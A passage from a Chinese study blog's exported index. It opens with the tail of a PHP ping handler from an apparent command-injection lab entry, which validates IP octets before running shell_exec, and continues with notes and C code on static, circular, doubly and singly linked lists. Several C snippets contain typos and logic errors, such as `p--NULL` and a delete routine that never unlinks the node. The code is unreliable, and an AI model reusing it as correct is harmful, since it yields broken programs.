class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together. </span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>]; <span class="comment">//后端格式验证，用.拼接起来</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125;                                                                   </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>静态链表</title>
    <url>/2022/08/10/%E9%9D%99%E6%80%81%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>静态链表的定义初始化基本操作的原理和代码实现</p>
<span id="more"></span>
<h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>分配一整片连续的内存空间，各个结点集中安置</p>
<p><img src="/2022/08/10/%E9%9D%99%E6%80%81%E9%93%BE%E8%A1%A8/image-20220519204020786.png" alt></p>
<p>游标为-1表示以及到达表尾</p>
<p>游标充当指针</p>
<p>计算：每个数据元素4B，每个游标4B，设起始地址为addr，e1的地址为：</p>
<script type="math/tex; mode=display">
addr+8B*2</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//静态链表最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>     <span class="comment">//静态链表结构类型的定义</span></span><br><span class="line">    ElemType data;   <span class="comment">//存放数据元素</span></span><br><span class="line">    <span class="type">int</span> next;        <span class="comment">//下一个元素的数组下标</span></span><br><span class="line">&#125;SLinkList[MaxSize];</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">SLinkList</span>[<span class="title">MaxSize</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    SLinkList a;    <span class="comment">//a看起来是一个静态链表</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">a</span>[<span class="title">MaxSize</span>];</span>  <span class="comment">//a看起来是一个node型数组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>将a[0]的next设置为-1</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>从头结点出发遍历结点</p>
<p>时间复杂度为O(n)</p>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>(1)找到一个空的结点，存入数据元素</p>
<p>(2)从头结点出发找到位序为i-1的结点</p>
<p>(3)修改新结点的next</p>
<p>(4)修改i-号结点的next</p>
<p>如何判断为空？————可以让next设置为特殊值</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>(1)从头结点出发找到前驱结点</p>
<p>(2)修改前驱结点的游标</p>
<p>(3)被删除的结点next设为-2</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>静态链表：用数组的方式实现的链表</p>
<p>逻辑上相邻的元素可以在物理上不相邻</p>
<p>优点：增删操作不需要大量移动元素</p>
<p>缺点：不能随机存取，固定容量不可变</p>
<p>使用场景：不支持指针的低级语言。数据元素数量固定不变的场景（操作系统的文件分配表）</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>链表</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>循环链表</title>
    <url>/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>循环单链表和循环双链表的代码实现</p>
<span id="more"></span>
<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p>分为：循环单链表，循环双链表</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519201322333.png" alt></p>
<h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><h4 id="定义循环单链表"><a href="#定义循环单链表" class="headerlink" title="定义循环单链表"></a>定义循环单链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>         <span class="comment">//定义单链表结点类型</span></span><br><span class="line">	ElemType data;            <span class="comment">//每个结点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>       <span class="comment">//指针指向下一个结点</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个循环单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode * )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));   <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span>(L==null)                 <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next=L;                   <span class="comment">//头结点next指向头结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断循环单链表是否为空</span></span><br><span class="line"><span class="type">bool</span> Empty(LinkList L)&#123;</span><br><span class="line">	<span class="keyword">if</span>(L-&gt;next == 	L)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断结点p是否为循环单链表的表尾结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(LinkList L,LNide *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next==L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>循环单链表可以从任意一个点出发找到任何一个结点</p>
<p>应用场景：在项目中需要经常对表头和表尾进行操作</p>
<h3 id="循环双链表"><a href="#循环双链表" class="headerlink" title="循环双链表"></a>循环双链表</h3><p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202518705.png" alt></p>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202611055.png" alt></p>
<p>示意图</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202626494.png" alt></p>
<p>判空</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202646358.png" alt></p>
<p>寻找表尾</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202653076.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>链表</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>双链表</title>
    <url>/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>双链表的初始化、基本操作和遍历</p>
<span id="more"></span>
<h2 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h2><h3 id="初始化（带头结点）"><a href="#初始化（带头结点）" class="headerlink" title="初始化（带头结点）"></a>初始化（带头结点）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DlinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (DNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    <span class="keyword">if</span>(L==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;prior = null;</span><br><span class="line">    L-&gt;next = null;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testDLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    DLinkList L;</span><br><span class="line">    InitDLinkList(L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/image-20220519174125025.png" alt></p>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>后插操作</p>
<p><img src="/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/image-20220519174230546.png" alt></p>
<p><img src="/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/image-20220519174327671.png" alt></p>
<p>前插操作：通过双链表的特性可以找到插入位置的前一个结点，再对该结点进行后插操作</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeketeNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    DNode *q = p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(q==null)          <span class="comment">//p没有后继</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;next!=null)</span><br><span class="line">        q-&gt;next-&gt;prior=p;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="销毁双链表"><a href="#销毁双链表" class="headerlink" title="销毁双链表"></a>销毁双链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryList</span><span class="params">(DLinklist &amp;L)</span>&#123;</span><br><span class="line">    <span class="comment">//循环释放各个数据结点</span></span><br><span class="line">    <span class="keyword">while</span> (L-&gt;next != null)</span><br><span class="line">        DeleteNextDNode(L);</span><br><span class="line">    <span class="built_in">free</span>(L);   <span class="comment">//释放头结点</span></span><br><span class="line">    L=null;    <span class="comment">//头指针指向null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><h4 id="后向遍历"><a href="#后向遍历" class="headerlink" title="后向遍历"></a>后向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p!=null)&#123;</span><br><span class="line">    <span class="comment">//对结点p做相应处理，eg按位查找按值查找打印等</span></span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="前向遍历"><a href="#前向遍历" class="headerlink" title="前向遍历"></a>前向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p-&gt;prior != null)&#123;</span><br><span class="line">	p=p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度:O(n)</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>链表</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表的基本操作</title>
    <url>/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>单链表的插入删除和查找操作的原理解析和代码实现</p>
<span id="more"></span>
<h3 id="插入和删除"><a href="#插入和删除" class="headerlink" title="插入和删除"></a>插入和删除</h3><h4 id="按位序插入"><a href="#按位序插入" class="headerlink" title="按位序插入"></a>按位序插入</h4><p>带头结点</p>
<p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519145908546.png" alt></p>
<p>if i = 6 : p指向NULL，则第i-1节点不存在，直接返回false</p>
<p>时间复杂度：O(n)</p>
<p>不带头节点</p>
<p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519150604589.png" alt></p>
<p>不带头结点需要一段单独的代码来应对i=1的情况</p>
<h4 id="指定节点的后插操作"><a href="#指定节点的后插操作" class="headerlink" title="指定节点的后插操作"></a>指定节点的后插操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,* LinkList</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InserNextNode</span> <span class="params">(LNode *p ,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)               <span class="comment">//内存分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;data = e;              <span class="comment">//结点s保存数据元素e</span></span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	LNode *p;</span><br><span class="line">   	<span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">	p = L;</span><br><span class="line">	<span class="keyword">while</span> (p! = <span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> InsertNextNode(p,e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<h4 id="前插操作"><a href="#前插操作" class="headerlink" title="前插操作"></a>前插操作</h4><p>两种方法：（1)传入头节点，依次遍历（2）采用后插方式，将节点p的值赋给新申请的节点，将插入的值赋给节点p</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">insertpriornode</span> <span class="params">(LNode *p, ElemTyoe e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;            <span class="comment">//新结点s连到p结点后</span></span><br><span class="line">    s-&gt;data=p-&gt;data;      <span class="comment">//将p中元素赋值给s</span></span><br><span class="line">    p-&gt;data=e;            <span class="comment">//p中元素覆盖为e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519153009590.png" alt></p>
<p>时间复杂度：O(1)</p>
<h4 id="按位序删除"><a href="#按位序删除" class="headerlink" title="按位序删除"></a>按位序删除</h4><p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519154105544.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">listdelete</span><span class="params">(linklist &amp;L,<span class="type">int</span> i,elemtype &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q=p-&gt;next;</span><br><span class="line">    e = q-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最好时间复杂度：O(1)</p>
<p>最坏/平均时间复杂度：O(n)</p>
<h4 id="指定节点的删除"><a href="#指定节点的删除" class="headerlink" title="指定节点的删除"></a>指定节点的删除</h4><p>下面例子为带头结点的单链表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">deletenode</span> <span class="params">(lnode *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p--<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q = p-&gt;next;</span><br><span class="line">    p-&gt;data = p-&gt;next-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<p>如果p是最后一个节点，只能依次寻找p的前驱，时间复杂度为O(n)</p>
<h3 id="单链表的查找"><a href="#单链表的查找" class="headerlink" title="单链表的查找"></a>单链表的查找</h3><p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519162949205.png" alt></p>
<h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">    	j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">LocateElem</span><span class="params">(LinkList L,ElemType e)</span>&#123;</span><br><span class="line">    LNode *p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>平均时间复杂度：O(n)</p>
<h4 id="求表长"><a href="#求表长" class="headerlink" title="求表长"></a>求表长</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Length</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">	<span class="type">int</span> len =<span class="number">0</span>;           <span class="comment">//统计表长</span></span><br><span class="line">	LNode *p = L;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		len++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(n)</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>顺序表</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表的构造</title>
    <url>/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>带头结点和不带头结点的单链表的代码表示和使用头插法或尾插法建立单链表</p>
<span id="more"></span>
<h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518210935623.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>                <span class="comment">//定义单链表节点类型</span></span><br><span class="line">    ElemType data;           <span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针指向像一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LNode));                     <span class="comment">//增加一个新的节点：在内存中申请一个节点所需空间，并用指针p指向这个节点</span></span><br></pre></td></tr></table></figure>
<p>typedef 关键字 —— 数据类型重命名</p>
<p>typedef &lt;数据类型&gt;&lt;别名&gt;</p>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518211715052.png" alt></p>
<p> <img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518211913545.png" alt></p>
<p>LNode * ：表示return的时一个节点</p>
<p>LinkList L：强调是一个单链表L</p>
<h4 id="不带头节点的单链表"><a href="#不带头节点的单链表" class="headerlink" title="不带头节点的单链表"></a>不带头节点的单链表</h4><p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518212144006.png" alt></p>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518212155476.png" alt></p>
<p>是否为空的判断是头节点是否为NULL</p>
<h4 id="带头结点的单链表"><a href="#带头结点的单链表" class="headerlink" title="带头结点的单链表"></a>带头结点的单链表</h4><p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518212310388.png" alt></p>
<p>不带头节点的单链表在头指针后的data就开始存储数据，带头节点的单链表的第二个节点不存储数据，为NULL</p>
<h3 id="单链表的建立"><a href="#单链表的建立" class="headerlink" title="单链表的建立"></a>单链表的建立</h3><h4 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	ElemType data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//分配一个头结点L</span></span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)                         <span 